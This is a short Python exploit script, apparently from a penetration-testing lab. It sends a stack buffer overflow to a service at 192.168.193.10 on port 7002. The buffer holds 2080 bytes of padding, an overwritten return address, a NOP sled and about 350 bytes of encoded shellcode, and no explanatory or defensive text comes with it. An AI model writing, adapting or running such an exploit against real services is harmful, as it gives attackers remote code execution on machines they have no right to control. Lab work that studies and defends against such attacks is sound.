#!/usr/bin/python
import socket

payload =  b""
payload += b"\xda\xc6\xbd\xb9\x1a\x96\xd9\xd9\x74\x24\xf4\x5b"
payload += b"\x33\xc9\xb1\x52\x83\xeb\xfc\x31\x6b\x13\x03\xd2"
payload += b"\x09\x74\x2c\xd8\xc6\xfa\xcf\x20\x17\x9b\x46\xc5"
payload += b"\x26\x9b\x3d\x8e\x19\x2b\x35\xc2\x95\xc0\x1b\xf6"
payload += b"\x2e\xa4\xb3\xf9\x87\x03\xe2\x34\x17\x3f\xd6\x57"
payload += b"\x9b\x42\x0b\xb7\xa2\x8c\x5e\xb6\xe3\xf1\x93\xea"
payload += b"\xbc\x7e\x01\x1a\xc8\xcb\x9a\x91\x82\xda\x9a\x46"
payload += b"\x52\xdc\x8b\xd9\xe8\x87\x0b\xd8\x3d\xbc\x05\xc2"
payload += b"\x22\xf9\xdc\x79\x90\x75\xdf\xab\xe8\x76\x4c\x92"
payload += b"\xc4\x84\x8c\xd3\xe3\x76\xfb\x2d\x10\x0a\xfc\xea"
payload += b"\x6a\xd0\x89\xe8\xcd\x93\x2a\xd4\xec\x70\xac\x9f"
payload += b"\xe3\x3d\xba\xc7\xe7\xc0\x6f\x7c\x13\x48\x8e\x52"
payload += b"\x95\x0a\xb5\x76\xfd\xc9\xd4\x2f\x5b\xbf\xe9\x2f"
payload += b"\x04\x60\x4c\x24\xa9\x75\xfd\x67\xa6\xba\xcc\x97"
payload += b"\x36\xd5\x47\xe4\x04\x7a\xfc\x62\x25\xf3\xda\x75"
payload += b"\x4a\x2e\x9a\xe9\xb5\xd1\xdb\x20\x72\x85\x8b\x5a"
payload += b"\x53\xa6\x47\x9a\x5c\x73\xc7\xca\xf2\x2c\xa8\xba"
payload += b"\xb2\x9c\x40\xd0\x3c\xc2\x71\xdb\x96\x6b\x1b\x26"
payload += b"\x71\x54\x74\xe9\x8b\x3c\x87\xe9\x8a\x07\x0e\x0f"
payload += b"\xe6\x67\x47\x98\x9f\x1e\xc2\x52\x01\xde\xd8\x1f"
payload += b"\x01\x54\xef\xe0\xcc\x9d\x9a\xf2\xb9\x6d\xd1\xa8"
payload += b"\x6c\x71\xcf\xc4\xf3\xe0\x94\x14\x7d\x19\x03\x43"
payload += b"\x2a\xef\x5a\x01\xc6\x56\xf5\x37\x1b\x0e\x3e\xf3"
payload += b"\xc0\xf3\xc1\xfa\x85\x48\xe6\xec\x53\x50\xa2\x58"
payload += b"\x0c\x07\x7c\x36\xea\xf1\xce\xe0\xa4\xae\x98\x64"
payload += b"\x30\x9d\x1a\xf2\x3d\xc8\xec\x1a\x8f\xa5\xa8\x25"
payload += b"\x20\x22\x3d\x5e\x5c\xd2\xc2\xb5\xe4\xf2\x20\x1f"
payload += b"\x11\x9b\xfc\xca\x98\xc6\xfe\x21\xde\xfe\x7c\xc3"
payload += b"\x9f\x04\x9c\xa6\x9a\x41\x1a\x5b\xd7\xda\xcf\x5b"
payload += b"\x44\xda\xc5" # badchars: \x00\x3b\x45

try:
  print("\nSending evil buffer...")

  offset = "A" * 2080
  eip    = "\x3d\x11\x80\x14" # 1480113d
  fill   = "C" * 4
  nops   = "\x90" * 10

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.193.10", 7002))
  s.send(offset + eip + fill + nops + payload)
  s.close()

  print("\nDone!")
  
except:
  print("\nCould not connect!")